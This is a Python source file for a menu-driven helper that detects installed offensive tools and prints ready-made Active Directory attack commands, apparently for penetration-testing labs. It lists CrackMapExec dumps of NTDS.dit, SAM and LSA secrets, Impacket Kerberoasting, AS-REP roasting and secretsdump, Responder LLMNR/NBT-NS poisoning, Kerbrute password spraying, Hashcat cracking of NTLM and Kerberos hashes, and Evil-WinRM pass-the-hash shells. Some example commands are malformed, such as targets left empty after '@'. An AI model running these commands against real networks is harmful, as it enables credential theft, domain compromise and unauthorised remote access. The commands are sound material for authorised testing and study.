from colors import Colors
import subprocess
import shutil

class Tool:
    def __init__(self, name, bins):
        self.name = name
        self.bins = self.find_bins(bins)
        self.options = []

    def find_bins(self, possible_bins):
        bins = {}
        for key, bin_list in possible_bins.items():
            for bin_name in bin_list:
                bin_path = shutil.which(bin_name)
                if bin_path:
                    bins[key] = bin_path
                    break
                else:
                    alias = get_alias(bin_name)
                    if alias:
                        bins[key] = alias
                        break
        return bins

    def add_option(self, name, description, command, example, bin_key):
        if bin_key not in self.bins:
            return
        command = self.bins[bin_key] + " " + command.split(" ", 1)[1]
        self.options.append({'name': name, 'description': description, 'command': command, 'example': example})

    def display_options(self):
        print(f"Options for {self.name}:")
        for i, option in enumerate(self.options, start=1):
            print(f"{i}) {option['description']}")

    def handle_options(self, option):
        try:
            option = int(option)
            selected_option = self.options[option - 1]
            print(f"\n{selected_option['name']}\nDescription: {selected_option['description']}\nUsage: {selected_option['command']}\nExample: {selected_option['example']}\n")
            return selected_option['command']
        except (ValueError, IndexError):
            return "Invalid option"

# This is for programs that are run through aliases
def get_alias(alias):
    try:
        output = subprocess.check_output(f"alias {alias}", shell=True, executable="/bin/bash")
        command = output.decode().split("=")[1].strip()
        command = command[1:-1]
        return command
    except subprocess.CalledProcessError:
        return None

def get_valid_tools(tools):
    print(f"\n{Colors.GREEN}[+] Checking for installed tools...{Colors.RESET}")
    valid_tools = []
    for tool in tools:
        if tool.bins:
            valid_tools.append(tool)
        else:
            print(f"{Colors.RED}[-] {tool.name} may not be installed on the system{Colors.RESET}")
    print(f"{Colors.GREEN}[+] {len(valid_tools)} tools found{Colors.RESET}")
    return valid_tools

def create_tools():
    #CrackMapExec
    crackmapexec_bins = {
        "main": ["crackmapexec", "cme"]
    }

    crackmapexec = Tool("CrackMapExec", crackmapexec_bins)
    crackmapexec.add_option("Enumerate Shares", "Enumerate SMB shares with guest authentication", "crackmapexec smb <target_ip> -u '<username>' -p '<password>' --shares", "crackmapexec smb 172.16.5.7 -u 'Guest' -p '' --shares", 'main')
    crackmapexec.add_option("Enumerate Users", "Enumerate users on the target using SMB with guest authentication", "crackmapexec smb <target_ip> -u '<username>' -p '<password>' --users", "crackmapexec smb 172.16.5.7 -u 'Guest' -p '' --users", 'main')
    crackmapexec.add_option("Enumerate Groups", "Enumerate groups on the target using SMB with guest authentication", "crackmapexec smb <target_ip> -u '<username>' -p '<password>' --groups", "crackmapexec smb 172.16.5.7 -u 'Guest' -p '' --groups", 'main')
    crackmapexec.add_option("Enumerate Logged in Users", "Enumerate logged in users on the target using SMB with guest authentication", "crackmapexec smb <target_ip> -u '<username>' -p '<password>' --loggedon-users", "crackmapexec smb 172.16.5.7 -u 'Guest' -p '' --loggedon-users", 'main')
    crackmapexec.add_option("Better way of enumerating shares/users/groups", "Enumerate shares/users/groups on the target using SMB with guest authentication\n Note: this only works if IPC$ share is readable", "crackmapexec smb <target_ip> -u '<username>' -p '<password>' --shares --rid-brute 10000", "crackmapexec smb 172.16.5.7 -u 'Guest' -p '' --shares --rid-brute 10000", 'main')
    crackmapexec.add_option("Enumerate Password Policy", "Enumerate the password policy for the target using SMB with guest authentication", "crackmapexec smb <target_ip> -u '<username>' -p '<password>' --pass-pol", "crackmapexec smb 172.16.5.7 -u 'Guest' -p '' --pass-pol", 'main')
    crackmapexec.add_option("Enumerate LDAP", "Enumerate LDAP domain/local groups, users/descriptions, users trusted for delegation, and users without a password with crackmapexec", "crackmapexec ldap <target_ip> -u '<username>' -p '<password>' --trusted-for-delegation --password-not-required --admin-count --users --groups", "crackmapexec ldap 172.16.5.7 -u 'admin' -p 'Password1' --trusted-for-delegation --password-not-required --admin-count --users --groups", 'main')
    crackmapexec.add_option("Dump NTDS.dit", "Dump NTDS.dit with crackmapexec", "crackmapexec smb <target_ip> -u '<username>' -p '<password>' --ntds vssadmin", "crackmapexec smb 172.16.5.7 -u 'admin' -p 'Password1' --ntds vssadmin", 'main')
    crackmapexec.add_option("Dump SAM/SYSTEM", "Dump SAM/SYSTEM with crackmapexec", "crackmapexec smb <target_ip> -u '<username>' -p '<password>' --sam", "crackmapexec smb 172.16.5.7 -u 'admin' -p 'Password1' --sam", 'main')
    crackmapexec.add_option("Dump LSA Secrets", "Dump LSA Secrets with crackmapexec", "crackmapexec smb <target_ip> -u '<username>' -p '<password>' --lsa", "crackmapexec smb 172.16.5.7 -u 'admin' -p 'Password1' --lsa", 'main')

    #Impacket
    impacket_bins = {
        "GetUserSPNs": ["GetUserSPNs.py", "GetUserSPNs", "impacket-GetUserSPNs"],
        "GetNPUsers": ["GetNPUsers.py", "GetNPUsers", "impacket-GetNPUsers"],
        "secretsdump": ["secretsdump.py", "secretsdump", "impacket-secretsdump"]
    }

    impacket = Tool("Impacket", impacket_bins)
    impacket.add_option("Kerberoast Attack", "Perform a kerberoast attack with impacket-GetUserSPNs", "impacket-GetUserSPNs <domain_name>/<username>:<password>@<target_ip>", "impacket-GetUserSPNs megacorp.local/admin:Password1@", 'GetUserSPNs')
    impacket.add_option("ASREPRoast Attack", "Perform an ASREPRoast attack with impacket-GetNPUsers", "impacket-GetNPUsers <domain_name>/<username>:<password>@<target_ip> -request", "impacket-GetNPUsers megacorp.local/admin:Password1@ -request", 'GetNPUsers')
    impacket.add_option("dump NTDS AD database to receieve NTLM hashes", "dump NTDS AD database to receieve NTLM hashes with impacket-secretsdump", "impacket-secretsdump -just-dc <domain_name>/<username>:<password>@<target_ip> -use-vss", "impacket-secretsdump -just-dc megacorp.local/admin:Password1@ -use-vss", 'secretsdump')
    impacket.add_option("Dump NTDS.dit", "Dump NTDS.dit with impacket-secretsdump", "impacket-secretsdump -ntds <ntds_path> -system <system_path> LOCAL", "impacket-secretsdump -ntds ntds.dit -system system LOCAL", 'secretsdump')
    impacket.add_option("Dump SAM/SYSTEM", "Dump SAM/SYSTEM with impacket-secretsdump", "impacket-secretsdump -sam <sam_path> -system <system_path> LOCAL", "impacket-secretsdump -sam sam -system system LOCAL", 'secretsdump')

    #Responder
    responder_bins = {
        "main": ["responder", "Responder.py"]
    }

    responder = Tool("Responder", responder_bins)
    responder.add_option("analysis mode", "Start Responder in analysis mode", "responder -I <interface> -A", "responder -I eth0 -A", 'main')
    responder.add_option("network traffic response spoofing", "Start Responder in network traffic response spoofing mode", "responder -I <interface> -w -d", "responder -I eth0 -w -d", 'main')
    responder.add_option("LLMNR/NBT-NS/MDNS poisoner", "Start Responder in LLMNR/NBT-NS/MDNS poisoner mode", "responder -I <interface> -wrf", "responder -I eth0 -wrf", 'main')

    #Kerbrute
    kerbrute_bins = {
        "main": ["kerbrute", "kerbrute_linux_amd64"]
    }

    kerbrute = Tool("Kerbrute", kerbrute_bins)
    kerbrute.add_option("enumerate valid AD users for password spraying", "Enumerate valid AD users for password spraying with kerbrute", "kerbrute userenum --dc <dc_ip> -d <domain_name> <user_list> -o kerb-results", "kerbrute userenum --dc 172.16.5.7 -d megacorp.local users.txt -o kerb-results", 'main')
    kerbrute.add_option("password spray", "Perform a password spraying attack using kerbrute", "kerbrute passwordspray --dc <dc_ip> -d <domain_name> <user_list> <password>", "kerbrute passwordspray --dc 172.16.5.7 -d megacorp.local users.txt passwords.txt/Welcome1", 'main')

    #Hashcat
    hashcat_bins = {
        "main": ["hashcat"]
    }

    hashcat = Tool("Hashcat", hashcat_bins)
    hashcat.add_option("NTLM hash cracking", "Crack NTLM hashes with hashcat", "hashcat -m 1000 <hash_file> <wordlist>", "hashcat -m 1000 hash.txt rockyou.txt", 'main')
    hashcat.add_option("NTLMv2 hash cracking", "Crack NTLMv2 hashes with hashcat", "hashcat -m 5600 <hash_file> <wordlist>", "hashcat -m 5600 hash.txt rockyou.txt", 'main')
    hashcat.add_option("Kerberos 5 hash cracking (From TGS)", "Crack Kerberos 5 hashes with hashcat", "hashcat -m 13100 <hash_file> <wordlist>", "hashcat -m 13100 hash.txt rockyou.txt", 'main')
    hashcat.add_option("Kerberos 5 hash cracking (ASREP)", "Crack ASREP hashes with hashcat", "hashcat -m 18200 <hash_file> <wordlist>", "hashcat -m 18200 hash.txt rockyou.txt", 'main')

    #Evil-WinRM
    evil_winrm_bins = {
        "main": ["evil-winrm"]
    }

    evil_winrm = Tool("Evil-WinRM", evil_winrm_bins)
    evil_winrm.add_option("Interactive Shell (Password)", "evil-winrm shell using password", "evil-winrm -i <target_ip> -u <username> -p <password>", "evil-winrm -i 172.16.5.7 -u admin -p Password1", 'main')
    evil_winrm.add_option("Interactive Shell (NTLM Hash)", "evil-winrm shell using NTLM hash", "evil-winrm -i <target_ip> -u <username> -H <hash>", "evil-winrm -i 172.16.5.7 -u admin -H 9a8b7c6d5e4f3a2b1c0d", 'main')

    return crackmapexec, impacket, responder, kerbrute, hashcat, evil_winrm